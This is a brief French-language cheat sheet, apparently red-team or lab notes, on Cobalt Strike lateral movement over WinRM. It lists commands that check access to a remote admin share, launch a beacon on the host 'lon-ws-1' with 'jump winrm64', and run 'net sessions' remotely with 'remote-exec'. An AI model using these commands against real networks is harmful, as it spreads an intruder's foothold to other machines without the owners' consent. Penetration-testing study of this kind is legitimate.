
Permet l'administration a distance avec PowerShell.



# Cobalt Strike

## Jump

Le beacon sera lancé dans le contexte de l'utilisateur actuel ou du user impersonné

Tester l'accès au serveur distant

```
ls \\lon-ws-1\c$
```

Lateraliser

```
jump winrm64 lon-ws-1 smb
```


## Remote exec

exécuter la commande net sessions au travers de WMI (retourne un output)

```
remote-exec winrm lon-ws-1 net sessions
```
